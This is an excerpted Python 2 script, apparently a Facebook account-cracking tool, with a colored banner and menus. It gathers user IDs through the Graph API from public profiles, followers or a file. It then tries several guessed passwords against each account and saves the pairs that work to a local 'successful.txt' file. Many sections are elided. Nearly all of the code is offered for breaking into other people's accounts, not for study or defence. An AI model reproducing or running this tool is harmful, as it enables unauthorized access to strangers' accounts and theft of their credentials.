...
#!/usr/bin/python2
#coding=utf-8
#originally written by naimat ali 
try:
...
\x1b[31;1md8b   db  .d8b.  .d8888. 
\x1b[1;97m888o  88 d8' `8b 88'  YP 
\x1b[36;1m88V8o 88 88ooo88 `8bo.  \x1b[31;1m{\x1b[32;1mV.2.8\x1b[31;1m}\x1b[0;97m  
\x1b[1;97m88 V8o88 88~~~88   `Y8b. 
\x1b[32;1m88  V888 88   88 db   8D 
\x1b[1;97mVP   V8P YP   YP `8888Y' 
                         
------------------------------------------
 ➣ Author\x1b[31;1m  :\x1b[0;97m Naimat Ali S****
 ➣ Github\x1b[31;1m  :\x1b[0;97m https://github.com/The-Nas
 ➣ \x1b[31;1mYoutube\x1b[32;1m :\x1b[0;97m Tech Nas
------------------------------------------
 Any\x1b[31;1m Problem\x1b[0;97m Connect Me On\x1b[32;1m WhatsApp\x1b[0;97m
------------------------------------------"""
successful = []
cpb = []
oks = []
...
def login_choice():
	os.system("clear")
	os.system("xdg-open  https://chat.whatsapp.com/CXqojByk6PvE2VefwcERU8") 
	try:
		open(".login.txt","r")
		menu()
	except IOError:
		...
		print(logo)
		print("")
		print("\t    \033[32;1mLOGIN MENU\033[0;97m")
		print("")
		print("\x1b[31;1m[\x1b[32;1m1\x1b[31;1m]\x1b[0;97m Login with token\x1b[0;97m")
		print("\x1b[31;1m[\x1b[32;1m2\x1b[31;1m]\x1b[0;97m Login with id/pass\x1b[0;97m")
		print("")
		login_select()
def login_select():
	select = raw_input("\033[1;93mChoose option\x1b[31;1m : \033[0;97m")
	if select =="1":
		login_token()
	elif select =="2":
		login_fb()
...
def login_token():
	...
	try:
	    ...
	    print("")
	    token = raw_input(" \x1b[1;33mPaste token here\x1b[31;1m :\x1b[0;97m ")
...
def menu():
	...
	print(logo)
	print("")
	print("\t    \033[1;32mUser\x1b[31;1m :\x1b[1;32m "+name+"\033[0;97m")
	print("")
	print(47*"-")
	print("")
	print("\x1b[31;1m[\x1b[32;1m1\x1b[31;1m]\x1b[0;97m Crack with auto pass\x1b[0;97m")
	print("\x1b[31;1m[\x1b[32;1m2\x1b[31;1m]\x1b[0;97m Crack with choice password\x1b[0;97m")
	print("\x1b[31;1m[\x1b[32;1m3\x1b[31;1m]\x1b[0;97m Extract ids\x1b[0;97m")
	print("")
	menu_option()
def menu_option():
	select = raw_input("\033[1;33mChoose option\x1b[31;1m : \033[0;97m")
	if select =="1":
		crack()
	elif select =="2":
		choice()
...
def crack():
	...
	print(logo)
	print("")
	print("\x1b[31;1m[\x1b[32;1m1\x1b[31;1m]\x1b[0;97m Crack public id\x1b[0;97m")
	print("\x1b[31;1m[\x1b[32;1m2\x1b[31;1m]\x1b[0;97m Crack followers\x1b[0;97m")
	print("\x1b[31;1m[\x1b[32;1m3\x1b[31;1m]\x1b[0;97m Crack file\x1b[0;97m")
	print("\x1b[32;1m[\x1b[31;1m0\x1b[32;1m]\x1b[31;1m Back\x1b[0;97m")
	print("")
	crack_select()
def crack_select():
	select = raw_input("\033[1;33mChoose option\x1b[31;1m : \033[0;97m")
	...
	if select =="1":
		...
		print("")
		idt = raw_input(" Input\x1b[32;1m id\x1b[31;1m :\x1b[0;97m ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print(" Cloning from\x1b[31;1m :\x1b[0;97m "+q["name"])
		except KeyError:
		...
		print("")
		crack_select()
	print(" Total IDs\x1b[31;1m :\x1b[0;97m "+str(len(id)))
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "loc" in q:
				print("\033[36;1m[Successful] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error"]:
					...
					q = json.loads(data)
					if "loc" in q:
						print("\033[36;1m[Successful] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("/sdcard/ids/successful.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error"]:
							...
							q = json.loads(data)
							if "loc" in q:
								print("\033[36;1m[Successful] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("/sdcard/ids/successful.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error"]:
									...
									q = json.loads(data)
									if "loc" in q:
										print("\033[36;1m[Successful] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("/sdcard/ids/successful.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error"]:
											...
											q = json.loads(data)
											if "loc" in q:
												print("\033[36;1m[Successful] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
												ok = open("/sdcard/ids/successful.txt", "a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error"]:
													...
													q = json.loads(data)
													if "loc" in q:
														print("\033[36;1m[Successful] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
														ok = open("/sdcard/ids/successful.txt", "a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error"]:
															...
															q = json.loads(data)
															if "loc" in q:
																print("\033[36;1m[Successful] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
																ok = open("/sdcard/ids/successful.txt", "a")
																ok.write(uid+" | "+pass7+"\n")
																ok.close()
	...
	print(47*"-")
	print("")
	print(" \x1b[32;1mThe process has completed\x1b[0;97m")
...
def ex_id():
    ...
    print("")
    idh = raw_input("Input\x1b[32;1m Id\x1b[31;1m :\x1b[0;97m ")
    try:
        r = requests.get("https://graph.facebook.com/"+idh+"?access_token="+token, headers=header)
        q = json.loads(r.text)
        print(" Collecting from\x1b[31;1m :\x1b[0;97m "+q["name"])
    except KeyError:
    	print("")
        print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
        print("")
    ...
    print("\x1b[32;1m File downloaded successfully\x1b[0;97m")
    time.sleep(1)
    menu()
def choice():
	global token
...
def choice_select():
	...
	if select =="1":
		...
		pass3 = raw_input(" Password: ")
		pass4 = raw_input(" Password: ")
		filelist = raw_input(" Input\x1b[32;1m file\x1b[31;1m :\x1b[0;97m ")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
